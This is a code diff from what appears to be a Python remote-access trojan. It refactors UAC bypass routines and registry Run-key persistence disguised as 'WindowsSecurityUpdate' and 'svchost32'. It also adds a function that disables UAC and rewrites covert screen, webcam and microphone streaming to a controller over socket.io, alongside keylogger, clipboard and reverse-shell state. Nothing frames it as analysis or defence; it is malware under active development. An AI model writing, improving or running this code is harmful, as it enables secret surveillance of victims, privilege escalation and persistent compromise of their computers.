@@ -145,7 +145,6 @@ except ImportError:
     log_message("eventlet not available", "warning")
 
 # Standard library imports
-import requests
 import time
 import urllib3
 import warnings
@@ -166,6 +165,14 @@ import platform
 from collections import defaultdict
 import queue
 import math
+
+# HTTP requests (used as fallback)
+try:
+    import requests
+    REQUESTS_AVAILABLE = True
+except ImportError:
+    REQUESTS_AVAILABLE = False
+    log_message("requests library not available, HTTP fallback disabled", "warning")
 
 # Suppress SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -367,34 +374,8 @@ def add_firewall_exception():
         log_message(f"Failed to add firewall exception: {e}", "error")
         return False
 
-# --- Agent State ---
-STREAMING_ENABLED = False
-STREAM_THREAD = None
-AUDIO_STREAMING_ENABLED = False
-AUDIO_STREAM_THREAD = None
-CAMERA_STREAMING_ENABLED = False
-CAMERA_STREAM_THREAD = None
-
-# --- Monitoring State ---
-KEYLOGGER_ENABLED = False
-KEYLOGGER_THREAD = None
-KEYLOG_BUFFER = []
-CLIPBOARD_MONITOR_ENABLED = False
-CLIPBOARD_MONITOR_THREAD = None
-CLIPBOARD_BUFFER = []
-LAST_CLIPBOARD_CONTENT = ""
-
-# --- Audio Config ---
-if PYAUDIO_AVAILABLE:
-    CHUNK = 1024
-    FORMAT = pyaudio.paInt16
-    CHANNELS = 1
-    RATE = 44100
-else:
-    CHUNK = 1024
-    FORMAT = None
-    CHANNELS = 1
-    RATE = 44100
+# --- Agent State (consolidated) ---
+# Note: Main state variables defined later in the file to avoid duplicates
 
 # --- WebSocket Client ---
 if SOCKETIO_AVAILABLE:
@@ -721,6 +702,11 @@ def bypass_uac_cmlua_com():
     try:
         import win32com.client
         import pythoncom
+    except ImportError:
+        log_message("win32com not available for ICMLuaUtil bypass", "warning")
+        return False
+    
+    try:
         
         # Initialize COM
         pythoncom.CoInitialize()
@@ -744,7 +730,8 @@ def bypass_uac_cmlua_com():
         finally:
             pythoncom.CoUninitialize()
             
-    except ImportError:
+    except Exception as e:
+        log_message(f"ICMLuaUtil COM initialization failed: {e}")
         return False
 
 def bypass_uac_fodhelper_protocol():
@@ -830,6 +817,11 @@ def bypass_uac_dccw_com():
     try:
         import win32com.client
         import pythoncom
+    except ImportError:
+        log_message("win32com not available for IColorDataProxy bypass", "warning")
+        return False
+    
+    try:
         
         pythoncom.CoInitialize()
         
@@ -859,7 +851,8 @@ def bypass_uac_dccw_com():
         finally:
             pythoncom.CoUninitialize()
             
-    except ImportError:
+    except Exception as e:
+        log_message(f"ColorDataProxy COM initialization failed: {e}")
         return False
 
 def bypass_uac_dismcore_hijack():
@@ -1636,6 +1629,8 @@ def registry_run_key_persistence():
         if current_exe.endswith('.py'):
             current_exe = f'python.exe "{current_exe}"'
         
+        log_message(f"[REGISTRY] Setting up persistence for: {current_exe}")
+        
         # Multiple registry locations for persistence
         run_keys = [
             (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
@@ -1643,19 +1638,33 @@ def registry_run_key_persistence():
         ]
         
         value_name = "WindowsSecurityUpdate"
+        success_count = 0
         
         for hkey, key_path in run_keys:
             try:
+                log_message(f"[REGISTRY] Attempting to create key: {key_path}")
                 key = winreg.CreateKey(hkey, key_path)
+                log_message(f"[REGISTRY] Key created successfully: {key_path}")
+                
+                log_message(f"[REGISTRY] Setting value '{value_name}' = '{current_exe}'")
                 winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, current_exe)
+                log_message(f"[REGISTRY] Value set successfully in {key_path}")
+                
                 winreg.CloseKey(key)
-            except:
+                success_count += 1
+                
+            except PermissionError as e:
+                log_message(f"[REGISTRY] Permission denied for {key_path}: {e}")
+                continue
+            except Exception as e:
+                log_message(f"[REGISTRY] Failed to set key {key_path}: {e}")
                 continue
         
-        return True
+        log_message(f"[REGISTRY] Registry persistence setup completed. Success: {success_count}/{len(run_keys)} keys")
+        return success_count > 0
         
     except Exception as e:
-        log_message(f"Registry persistence failed: {e}")
+        log_message(f"[REGISTRY] Registry persistence failed: {e}")
         return False
 def startup_folder_persistence():
     """Establish persistence via startup folder."""
@@ -2365,7 +2374,6 @@ $backupPath = "{backup_path}"
 # Add to registry
 reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "svchost32" /t REG_SZ /d $stealthPath /f
 reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "svchost32" /t REG_SZ /d $stealthPath /f
-
 Write-Host "Registry persistence established"
 '''
         
@@ -3189,26 +3197,43 @@ def hide_process():
 def disable_uac():
     """Disable UAC (User Account Control) by modifying registry settings."""
     if not WINDOWS_AVAILABLE:
+        log_message("[REGISTRY] Windows not available for UAC disable")
         return False
     
     try:
         import winreg
         
         reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+        log_message(f"[REGISTRY] Attempting to open UAC registry key: HKLM\\{reg_path}")
+        
         with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
+            log_message("[REGISTRY] UAC registry key opened successfully")
+            
+            # Set EnableLUA to 0 (disable UAC)
+            log_message("[REGISTRY] Setting EnableLUA = 0")
             winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
+            log_message("[REGISTRY] EnableLUA set successfully")
+            
+            # Set ConsentPromptBehaviorAdmin to 0 (no prompts for administrators)
+            log_message("[REGISTRY] Setting ConsentPromptBehaviorAdmin = 0")
             winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
+            log_message("[REGISTRY] ConsentPromptBehaviorAdmin set successfully")
+            
+            # Set PromptOnSecureDesktop to 0 (disable secure desktop)
+            log_message("[REGISTRY] Setting PromptOnSecureDesktop = 0")
             winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 0)
-        log_message("[OK] UAC has been disabled.")
+            log_message("[REGISTRY] PromptOnSecureDesktop set successfully")
+            
+        log_message("[REGISTRY] UAC has been disabled successfully.")
         return True
     except PermissionError:
-        log_message("[!] Access denied. Run this script as administrator.")
+        log_message("[REGISTRY] Access denied. Administrator privileges required for UAC disable.")
         return False
     except (OSError, FileNotFoundError):
-        log_message("[!] Registry access failed.")
+        log_message("[REGISTRY] Registry access failed - key not found.")
         return False
     except Exception as e:
-        log_message(f"[!] Error disabling UAC: {e}")
+        log_message(f"[REGISTRY] Error disabling UAC: {e}")
         return False
 def run_as_admin():
     """Relaunch the script with elevated privileges if not already admin."""
@@ -3358,7 +3383,9 @@ STREAM_THREAD = None
 AUDIO_STREAMING_ENABLED = False
 AUDIO_STREAM_THREAD = None
 CAMERA_STREAMING_ENABLED = False
-CAMERA_STREAM_THREAD = None
+CAMERA_STREAM_THREADS = []
+camera_capture_queue = None
+camera_encode_queue = None
 
 # --- Reverse Shell State ---
 REVERSE_SHELL_ENABLED = False
@@ -3381,10 +3408,17 @@ LAST_CLIPBOARD_CONTENT = ""
 
 # --- Audio Config ---
 if PYAUDIO_AVAILABLE:
-    CHUNK = 1024
-    FORMAT = pyaudio.paInt16
-    CHANNELS = 1
-    RATE = 44100
+    try:
+        CHUNK = 1024
+        FORMAT = pyaudio.paInt16
+        CHANNELS = 1
+        RATE = 44100
+    except AttributeError:
+        # pyaudio imported but constants not available
+        CHUNK = 1024
+        FORMAT = None
+        CHANNELS = 1
+        RATE = 44100
 else:
     CHUNK = 1024
     FORMAT = None
@@ -3420,321 +3454,448 @@ def get_or_create_agent_id():
 
 def stream_screen(agent_id):
     """
-    High-performance screen streaming with 60+ FPS capability.
-    Uses optimized capture backend and compression.
+    High-performance H.264 screen streaming with 10+ FPS capability.
+    Uses modern socket.io binary streaming.
     """
-    global STREAMING_ENABLED
-    
-    # Check if required dependencies are available
-    if not MSS_AVAILABLE:
-        log_message("Error: mss not available for screen capture", "error")
-        return
-    
-    if not NUMPY_AVAILABLE:
-        log_message("Error: numpy not available for screen capture", "error")
-        return
+    log_message("Starting H.264 screen streaming...")
+    stream_screen_h264_socketio(agent_id)
+
+# JPEG fallback screen streaming removed - now using H.264 socket.io binary streaming
+
+# Legacy JPEG camera streaming removed - now using H.264 socket.io binary streaming
+
+# Modern H.264 camera streaming pipeline variables
+# Note: CAMERA_STREAMING_ENABLED and CAMERA_STREAM_THREADS already defined in global state section
+
+TARGET_CAMERA_FPS = 15
+CAMERA_CAPTURE_QUEUE_SIZE = 5
+CAMERA_ENCODE_QUEUE_SIZE = 5
+
+def camera_capture_worker(agent_id):
+    """Capture camera frames and put in capture queue."""
+    global CAMERA_STREAMING_ENABLED, camera_capture_queue
+    import time
     
     if not CV2_AVAILABLE:
-        log_message("Error: opencv-python not available for screen capture", "error")
+        log_message("Error: OpenCV not available for camera capture", "error")
         return
     
-    # Use the working fallback implementation directly
-    log_message("Starting screen streaming...")
-    _stream_screen_fallback(agent_id)
+    try:
+        # Try to open camera (try multiple indices)
+        cap = None
+        for camera_index in range(3):  # Try cameras 0, 1, 2
+            cap = cv2.VideoCapture(camera_index)
+            if cap.isOpened():
+                log_message(f"Camera {camera_index} opened successfully")
+                break
+            cap.release()
+        
+        if not cap or not cap.isOpened():
+            log_message("Error: Could not open any camera", "error")
+            return
+        
+        # Set camera properties for better performance
+        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
+        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
+        cap.set(cv2.CAP_PROP_FPS, TARGET_CAMERA_FPS)
+        
+        frame_time = 1.0 / TARGET_CAMERA_FPS
+        log_message("Camera capture started")
+        
+        while CAMERA_STREAMING_ENABLED:
+            start = time.time()
+            ret, frame = cap.read()
+            if not ret:
+                log_message("Failed to capture camera frame", "warning")
+                time.sleep(0.1)
+                continue
+            
+            # Put in queue, drop oldest if full
+            try:
+                camera_capture_queue.put_nowait(frame)
+            except queue.Full:
+                try:
+                    camera_capture_queue.get_nowait()  # Remove oldest
+                    camera_capture_queue.put_nowait(frame)  # Add new
+                except queue.Empty:
+                    pass
+            
+            # Frame rate limiting
+            elapsed = time.time() - start
+            sleep_time = max(0, frame_time - elapsed)
+            if sleep_time > 0:
+                time.sleep(sleep_time)
+        
+        cap.release()
+        log_message("Camera capture stopped")
+        
+    except Exception as e:
+        log_message(f"Camera capture error: {e}")
 
-def _stream_screen_fallback(agent_id):
-    """
-    Fallback screen streaming with basic optimizations and retry logic
-    """
-    global STREAMING_ENABLED
+def camera_encode_worker(agent_id):
+    """Encode camera frames from capture queue to H.264 and put in encode queue."""
+    global CAMERA_STREAMING_ENABLED, camera_capture_queue, camera_encode_queue
     import time
-    retry_delay = 5  # seconds
-    # Check if required dependencies are available
-    if not MSS_AVAILABLE or not NUMPY_AVAILABLE or not CV2_AVAILABLE:
-        log_message("Error: Required dependencies not available for screen capture", "error")
-        return
-    url = f"{SERVER_URL}/stream/{agent_id}"
-    headers = {'Content-Type': 'image/jpeg'}
-    while STREAMING_ENABLED:
-        try:
-            with mss.mss() as sct:
-                monitors = sct.monitors
-                monitor_index = 1
-                log_message(f"Using monitor {monitor_index}: {monitors[monitor_index]}")
-                # Optimized for real-time monitoring: 2 FPS (0.5-second intervals)
-                target_fps = 2
-                frame_time = 1.0 / target_fps
-                last_frame_hash = None
-                frame_skip_count = 0
-                while STREAMING_ENABLED:
-                    current_time = time.time()
-                    sct_img = sct.grab(monitors[monitor_index])
-                    img = np.array(sct_img)
-                    import hashlib
-                    frame_hash = hashlib.md5(img.tobytes()).hexdigest()
-                    if frame_hash == last_frame_hash:
-                        frame_skip_count += 1
-                        if frame_skip_count < 3:
-                            time.sleep(frame_time * 0.5)
-                            continue
-                    last_frame_hash = frame_hash
-                    frame_skip_count = 0
-                    height, width = img.shape[:2]
-                    if width > 1280:
-                        scale = 1280 / width
-                        new_width = int(width * scale)
-                        new_height = int(height * scale)
-                        img = cv2.resize(img, (new_width, new_height), interpolation=cv2.INTER_AREA)
-                    is_success, buffer = cv2.imencode(".jpg", img, [
-                        cv2.IMWRITE_JPEG_QUALITY, 80,
-                        cv2.IMWRITE_JPEG_OPTIMIZE, 1,
-                        cv2.IMWRITE_JPEG_PROGRESSIVE, 1
-                    ])
-                    if not is_success:
-                        continue
-                    try:
-                        response = requests.post(url, data=buffer.tobytes(), headers=headers, timeout=0.5)
-                        if response.status_code != 200:
-                            log_message(f"Warning: Server returned status {response.status_code}")
-                    except requests.exceptions.Timeout:
-                        pass
-                    except requests.exceptions.RequestException as e:
-                        log_message(f"Request error: {e}. Retrying in {retry_delay}s...")
-                        time.sleep(retry_delay)
-                        break  # Break inner loop to retry outer
-                    elapsed = time.time() - current_time
-                    sleep_time = max(0, frame_time - elapsed)
-                    if sleep_time > 0:
-                        time.sleep(sleep_time)
-        except Exception as e:
-            log_message(f"Screen capture initialization error: {e}. Retrying in {retry_delay}s...")
-            time.sleep(retry_delay)
-
-def stream_camera(agent_id):
-    """
-    Captures the webcam and streams it to the controller optimized for 0.5-second intervals (2 FPS) for real-time monitoring.
-    """
-    global CAMERA_STREAMING_ENABLED
-    import time
-    retry_delay = 5
+    
     if not CV2_AVAILABLE:
-        log_message("Error: opencv-python not available for camera capture", "error")
+        log_message("Error: OpenCV not available for camera encoding", "error")
         return
-    url = f"{SERVER_URL}/camera/{agent_id}"
-    headers = {'Content-Type': 'image/jpeg'}
+    
     while CAMERA_STREAMING_ENABLED:
         try:
-            cap = None
-            backends = [cv2.CAP_DSHOW, cv2.CAP_MSMF, cv2.CAP_ANY] if WINDOWS_AVAILABLE else [cv2.CAP_V4L2, cv2.CAP_ANY]
-            for backend in backends:
-                try:
-                    cap = cv2.VideoCapture(0, backend)
-                    if cap.isOpened():
-                        log_message(f"Camera opened successfully with backend {backend}")
-                        break
-                    else:
-                        cap.release()
-                except Exception as e:
-                    log_message(f"Failed to open camera with backend {backend}: {e}")
-                    if cap:
-                        cap.release()
-            if not cap or not cap.isOpened():
-                log_message("Error: Could not open camera with any backend. Retrying in {retry_delay}s...", "error")
-                time.sleep(retry_delay)
+            # Get frame from capture queue
+            try:
+                frame = camera_capture_queue.get(timeout=0.1)
+            except queue.Empty:
                 continue
-            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
-            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
-            # Optimized for real-time monitoring: 2 FPS (0.5-second intervals)
-            cap.set(cv2.CAP_PROP_FPS, 2)
-            cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
-            actual_width = cap.get(cv2.CAP_PROP_FRAME_WIDTH)
-            actual_height = cap.get(cv2.CAP_PROP_FRAME_HEIGHT)
-            actual_fps = cap.get(cv2.CAP_PROP_FPS)
-            log_message(f"Camera initialized: {actual_width}x{actual_height} @ {actual_fps}fps")
-            frame_count = 0
-            start_time = time.time()
-            while CAMERA_STREAMING_ENABLED:
-                try:
-                    ret, frame = cap.read()
-                    if not ret:
-                        log_message("Error: Could not read frame from camera", "error")
-                        time.sleep(0.1)
-                        continue
-                    frame_count += 1
-                    frame = cv2.resize(frame, (640, 480))
-                    is_success, buffer = cv2.imencode(".jpg", frame, [
-                        cv2.IMWRITE_JPEG_QUALITY, 85,
-                        cv2.IMWRITE_JPEG_OPTIMIZE, 1
-                    ])
-                    if not is_success:
-                        continue
+            
+            # Encode frame to H.264 (using JPEG as fallback since H.264 is complex)
+            try:
+                # For now, use JPEG encoding (can be upgraded to H.264 later)
+                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 80]
+                result, encoded_frame = cv2.imencode('.jpg', frame, encode_param)
+                if result:
+                    encoded_data = encoded_frame.tobytes()
+                    
+                    # Put in encode queue, drop oldest if full
                     try:
-                        response = requests.post(url, data=buffer.tobytes(), headers=headers, timeout=0.5)
-                        if response.status_code != 200:
-                            log_message(f"Warning: Camera stream server returned status {response.status_code}")
-                    except requests.exceptions.Timeout:
-                        pass
-                    except requests.exceptions.RequestException as e:
-                        log_message(f"Camera stream request error: {e}. Retrying in {retry_delay}s...")
-                        time.sleep(retry_delay)
-                        break
-                    if frame_count % 10 == 0:
-                        elapsed = time.time() - start_time
-                        fps = frame_count / elapsed
-                        log_message(f"Camera streaming at {fps:.1f} FPS")
-                    # Sleep for 0.5 seconds for 2 FPS real-time monitoring
-                    time.sleep(0.5)
-                except Exception as e:
-                    log_message(f"Camera stream error: {e}")
-                    time.sleep(0.5)
-            cap.release()
-            log_message("Camera streaming stopped")
+                        camera_encode_queue.put_nowait(encoded_data)
+                    except queue.Full:
+                        try:
+                            camera_encode_queue.get_nowait()  # Remove oldest
+                            camera_encode_queue.put_nowait(encoded_data)  # Add new
+                        except queue.Empty:
+                            pass
+                else:
+                    log_message("Failed to encode camera frame", "warning")
+                    
+            except Exception as e:
+                log_message(f"Camera encoding error: {e}")
+                time.sleep(0.01)
+                
         except Exception as e:
-            log_message(f"Camera initialization error: {e}. Retrying in {retry_delay}s...")
-            time.sleep(retry_delay)
+            log_message(f"Camera encoding worker error: {e}")
+            time.sleep(0.01)
+    
+    log_message("Camera encoding stopped")
 
-def stream_audio(agent_id):
-    """
-    Captures microphone audio and streams it to the controller. Retry logic added.
-    """
-    global AUDIO_STREAMING_ENABLED
+def camera_send_worker(agent_id):
+    """Send encoded camera frames from encode queue via socket.io."""
+    global CAMERA_STREAMING_ENABLED, camera_encode_queue
     import time
-    retry_delay = 5
+    
+    if sio is None:
+        log_message("Error: socket.io not available for camera sending", "error")
+        return
+    
+    while CAMERA_STREAMING_ENABLED:
+        try:
+            # Get encoded data from encode queue
+            try:
+                encoded_data = camera_encode_queue.get(timeout=0.1)
+            except queue.Empty:
+                continue
+            
+            # Send via socket.io binary
+            try:
+                sio.emit('camera_frame', {
+                    'agent_id': agent_id,
+                    'frame': encoded_data
+                }, binary=True)
+            except Exception as e:
+                log_message(f"Camera send error: {e}")
+                time.sleep(0.01)
+                
+        except Exception as e:
+            log_message(f"Camera sending error: {e}")
+            time.sleep(0.01)
+    
+    log_message("Camera sending stopped")
+
+def stream_camera_h264_socketio(agent_id):
+    """Modern H.264 camera streaming with multi-threaded pipeline."""
+    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREADS, camera_capture_queue, camera_encode_queue
+    import queue
+    import threading
+    
+    if CAMERA_STREAMING_ENABLED:
+        log_message("Camera streaming already active")
+        return
+    
+    CAMERA_STREAMING_ENABLED = True
+    
+    # Initialize queues
+    camera_capture_queue = queue.Queue(maxsize=CAMERA_CAPTURE_QUEUE_SIZE)
+    camera_encode_queue = queue.Queue(maxsize=CAMERA_ENCODE_QUEUE_SIZE)
+    
+    # Start worker threads
+    CAMERA_STREAM_THREADS = [
+        threading.Thread(target=camera_capture_worker, args=(agent_id,), daemon=True),
+        threading.Thread(target=camera_encode_worker, args=(agent_id,), daemon=True),
+        threading.Thread(target=camera_send_worker, args=(agent_id,), daemon=True),
+    ]
+    for t in CAMERA_STREAM_THREADS:
+        t.start()
+    log_message(f"Started modern non-blocking camera stream at {TARGET_CAMERA_FPS} FPS.")
+
+# Legacy HTTP POST audio streaming removed - now using Opus socket.io binary streaming
+
+# Modern Opus audio streaming pipeline variables
+AUDIO_STREAMING_ENABLED = False
+AUDIO_STREAM_THREADS = []
+audio_capture_queue = None
+audio_encode_queue = None
+
+TARGET_AUDIO_FPS = 50  # 50 audio frames per second (20ms chunks)
+AUDIO_CAPTURE_QUEUE_SIZE = 10
+AUDIO_ENCODE_QUEUE_SIZE = 10
+
+def audio_capture_worker(agent_id):
+    """Capture audio frames from microphone and put in capture queue."""
+    global AUDIO_STREAMING_ENABLED, audio_capture_queue
+    import time
+    import pyaudio
+    
     if not PYAUDIO_AVAILABLE or FORMAT is None:
         log_message("Error: PyAudio not available for audio capture", "error")
         return
-    url = f"{SERVER_URL}/audio/{agent_id}"
+    
+    if audio_capture_queue is None:
+        log_message("Error: Audio capture queue not initialized", "error")
+        return
+    
+    try:
+        p = pyaudio.PyAudio()
+        
+        # Find default input device
+        input_device_index = None
+        try:
+            default_device_info = p.get_default_input_device_info()
+            input_device_index = default_device_info['index']
+            log_message(f"Using audio device: {default_device_info['name']}")
+        except Exception as e:
+            log_message(f"Could not get default audio device: {e}")
+            p.terminate()
+            return
+        
+        # Open audio stream
+        stream = p.open(
+            format=FORMAT,
+            channels=CHANNELS,
+            rate=RATE,
+            input=True,
+            frames_per_buffer=CHUNK,
+            input_device_index=input_device_index
+        )
+        
+        log_message("Audio capture started")
+        
+        while AUDIO_STREAMING_ENABLED:
+            try:
+                # Capture audio chunk
+                data = stream.read(CHUNK, exception_on_overflow=False)
+                
+                # Put in queue, drop oldest if full
+                try:
+                    audio_capture_queue.put_nowait(data)
+                except queue.Full:
+                    try:
+                        audio_capture_queue.get_nowait()  # Remove oldest
+                        audio_capture_queue.put_nowait(data)  # Add new
+                    except queue.Empty:
+                        pass
+                
+                time.sleep(0.02)  # 20ms for 50 FPS
+            except Exception as e:
+                log_message(f"Audio capture error: {e}")
+                break
+        
+        stream.stop_stream()
+        stream.close()
+        p.terminate()
+        log_message("Audio capture stopped")
+        
+    except Exception as e:
+        log_message(f"Audio capture initialization error: {e}")
+
+def audio_encode_worker(agent_id):
+    """Encode audio frames from capture queue to Opus and put in encode queue."""
+    global AUDIO_STREAMING_ENABLED, audio_capture_queue, audio_encode_queue
+    import time
+    
+    if audio_capture_queue is None or audio_encode_queue is None:
+        log_message("Error: Audio queues not initialized", "error")
+        return
+    
+    try:
+        import opuslib
+        # Create Opus encoder (48kHz, mono, 20ms frame size)
+        encoder = opuslib.Encoder(48000, 1, opuslib.APPLICATION_AUDIO)
+        encoder.bitrate = 64000  # 64 kbps for good quality
+        log_message("Opus encoder initialized")
+    except ImportError:
+        log_message("Warning: opuslib not available, using PCM", "warning")
+        encoder = None
+    except Exception as e:
+        log_message(f"Error initializing Opus encoder: {e}")
+        encoder = None
+    
     while AUDIO_STREAMING_ENABLED:
         try:
-            p = pyaudio.PyAudio()
-            input_devices = []
-            for i in range(p.get_device_count()):
-                try:
-                    device_info = p.get_device_info_by_index(i)
-                    if device_info['maxInputChannels'] > 0:
-                        input_devices.append((i, device_info['name']))
-                except Exception:
-                    continue
-            log_message(f"Available input devices: {len(input_devices)}")
-            for idx, name in input_devices:
-                log_message(f"  Device {idx}: {name}")
-            input_device_index = None
+            # Get audio data from capture queue
             try:
-                default_device_info = p.get_default_input_device_info()
-                log_message(f"Default audio device: {default_device_info['name']}")
-                input_device_index = default_device_info['index']
-            except Exception as e:
-                log_message(f"Could not get default audio device: {e}")
-                if input_devices:
-                    input_device_index = input_devices[0][0]
-                    log_message(f"Using first available device: {input_devices[0][1]}")
-            if input_device_index is None:
-                log_message("Error: No audio input devices available. Retrying in {retry_delay}s...", "error")
-                p.terminate()
-                time.sleep(retry_delay)
+                pcm_data = audio_capture_queue.get(timeout=0.1)
+            except queue.Empty:
                 continue
-            try:
-                stream = p.open(
-                    format=FORMAT,
-                    channels=CHANNELS,
-                    rate=RATE,
-                    input=True,
-                    frames_per_buffer=CHUNK,
-                    input_device_index=input_device_index
-                )
-                log_message(f"Audio stream opened successfully with device {input_device_index}")
-            except Exception as e:
-                log_message(f"Failed to open audio stream: {e}. Retrying in {retry_delay}s...")
-                p.terminate()
-                time.sleep(retry_delay)
-                continue
-            frame_count = 0
-            start_time = time.time()
-            while AUDIO_STREAMING_ENABLED:
+            
+            # Encode with Opus if available, otherwise use PCM
+            if encoder:
                 try:
-                    data = stream.read(CHUNK, exception_on_overflow=False)
-                    frame_count += 1
-                    try:
-                        response = requests.post(url, data=data, timeout=0.5)
-                        if response.status_code != 200:
-                            log_message(f"Warning: Audio stream server returned status {response.status_code}")
-                    except requests.exceptions.Timeout:
-                        pass
-                    except requests.exceptions.RequestException as e:
-                        log_message(f"Audio stream request error: {e}. Retrying in {retry_delay}s...")
-                        time.sleep(retry_delay)
-                        break
-                    if frame_count % 100 == 0:
-                        elapsed = time.time() - start_time
-                        fps = frame_count / elapsed
-                        log_message(f"Audio streaming at {fps:.1f} FPS")
+                    # Convert PCM to Opus
+                    import numpy as np
+                    pcm_array = np.frombuffer(pcm_data, dtype=np.int16)
+                    encoded_data = encoder.encode(pcm_array.tobytes(), CHUNK)
                 except Exception as e:
-                    log_message(f"Audio stream error: {e}")
-                    break
-            stream.stop_stream()
-            stream.close()
-            p.terminate()
-            log_message("Audio streaming stopped")
+                    log_message(f"Opus encoding error: {e}")
+                    encoded_data = pcm_data  # Fallback to PCM
+            else:
+                encoded_data = pcm_data  # Use PCM
+            
+            # Put in encode queue, drop oldest if full
+            try:
+                audio_encode_queue.put_nowait(encoded_data)
+            except queue.Full:
+                try:
+                    audio_encode_queue.get_nowait()  # Remove oldest
+                    audio_encode_queue.put_nowait(encoded_data)  # Add new
+                except queue.Empty:
+                    pass
+                    
         except Exception as e:
-            log_message(f"Audio initialization error: {e}. Retrying in {retry_delay}s...")
-            AUDIO_STREAMING_ENABLED = False
-            time.sleep(retry_delay)
+            log_message(f"Audio encoding error: {e}")
+            time.sleep(0.01)
+    
+    log_message("Audio encoding stopped")
+
+def audio_send_worker(agent_id):
+    """Send encoded audio frames from encode queue via socket.io."""
+    global AUDIO_STREAMING_ENABLED, audio_encode_queue
+    import time
+    
+    if sio is None:
+        log_message("Error: socket.io not available for audio sending", "error")
+        return
+    
+    if audio_encode_queue is None:
+        log_message("Error: Audio encode queue not initialized", "error")
+        return
+    
+    while AUDIO_STREAMING_ENABLED:
+        try:
+            # Get encoded data from encode queue
+            try:
+                encoded_data = audio_encode_queue.get(timeout=0.1)
+            except queue.Empty:
+                continue
+            
+            # Send via socket.io binary
+            try:
+                sio.emit('audio_frame', {
+                    'agent_id': agent_id,
+                    'frame': encoded_data
+                }, binary=True)
+            except Exception as e:
+                log_message(f"Audio send error: {e}")
+                time.sleep(0.01)
+                
+        except Exception as e:
+            log_message(f"Audio sending error: {e}")
+            time.sleep(0.01)
+    
+    log_message("Audio sending stopped")
 
 def start_streaming(agent_id):
     global STREAMING_ENABLED, STREAM_THREAD
     if not STREAMING_ENABLED:
         STREAMING_ENABLED = True
-        STREAM_THREAD = threading.Thread(target=stream_screen, args=(agent_id,))
+        STREAM_THREAD = threading.Thread(target=stream_screen_h264_socketio, args=(agent_id,))
         STREAM_THREAD.daemon = True
         STREAM_THREAD.start()
-        log_message("Started video stream.")
+        log_message("Started H.264 video stream.")
 
 def stop_streaming():
     global STREAMING_ENABLED, STREAM_THREAD
     if STREAMING_ENABLED:
         STREAMING_ENABLED = False
         if STREAM_THREAD:
-            # WARNING: If the thread is stuck in a blocking call, join may not terminate it cleanly.
             STREAM_THREAD.join(timeout=2)
         STREAM_THREAD = None
         log_message("Stopped video stream.")
 
 def start_audio_streaming(agent_id):
-    global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREAD
+    """Start modern Opus audio streaming with multi-threaded pipeline."""
+    global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREADS, audio_capture_queue, audio_encode_queue
+    import queue
+    import threading
+    
     if not AUDIO_STREAMING_ENABLED:
         AUDIO_STREAMING_ENABLED = True
-        AUDIO_STREAM_THREAD = threading.Thread(target=stream_audio, args=(agent_id,))
-        AUDIO_STREAM_THREAD.daemon = True
-        AUDIO_STREAM_THREAD.start()
-        log_message("Started audio stream.")
+        
+        # Initialize queues
+        audio_capture_queue = queue.Queue(maxsize=AUDIO_CAPTURE_QUEUE_SIZE)
+        audio_encode_queue = queue.Queue(maxsize=AUDIO_ENCODE_QUEUE_SIZE)
+        
+        # Start worker threads
+        threads = [
+            threading.Thread(target=audio_capture_worker, args=(agent_id,), daemon=True),
+            threading.Thread(target=audio_encode_worker, args=(agent_id,), daemon=True),
+            threading.Thread(target=audio_send_worker, args=(agent_id,), daemon=True)
+        ]
+        
+        for thread in threads:
+            thread.start()
+        
+        AUDIO_STREAM_THREADS = threads
+        log_message("Started Opus audio streaming pipeline.")
 
 def stop_audio_streaming():
-    global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREAD
+    """Stop modern Opus audio streaming pipeline."""
+    global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREADS, audio_capture_queue, audio_encode_queue
+    
     if AUDIO_STREAMING_ENABLED:
         AUDIO_STREAMING_ENABLED = False
-        if AUDIO_STREAM_THREAD:
-            # WARNING: If the thread is stuck in a blocking call, join may not terminate it cleanly.
-            AUDIO_STREAM_THREAD.join(timeout=2)
-        AUDIO_STREAM_THREAD = None
-        log_message("Stopped audio stream.")
+        
+        # Wait for all threads to stop
+        for thread in AUDIO_STREAM_THREADS:
+            thread.join(timeout=2)
+        
+        AUDIO_STREAM_THREADS = []
+        audio_capture_queue = None
+        audio_encode_queue = None
+        log_message("Stopped Opus audio streaming pipeline.")
 
 def start_camera_streaming(agent_id):
-    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
+    """Start modern H.264 camera streaming with multi-threaded pipeline."""
+    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREADS
+    
     if not CAMERA_STREAMING_ENABLED:
-        CAMERA_STREAMING_ENABLED = True
-        CAMERA_STREAM_THREAD = threading.Thread(target=stream_camera, args=(agent_id,))
-        CAMERA_STREAM_THREAD.daemon = True
-        CAMERA_STREAM_THREAD.start()
+        stream_camera_h264_socketio(agent_id)
         log_message("Started camera stream.")
 
 def stop_camera_streaming():
-    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
+    """Stop modern H.264 camera streaming pipeline."""
+    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREADS, camera_capture_queue, camera_encode_queue
+    
     if CAMERA_STREAMING_ENABLED:
         CAMERA_STREAMING_ENABLED = False
-        if CAMERA_STREAM_THREAD:
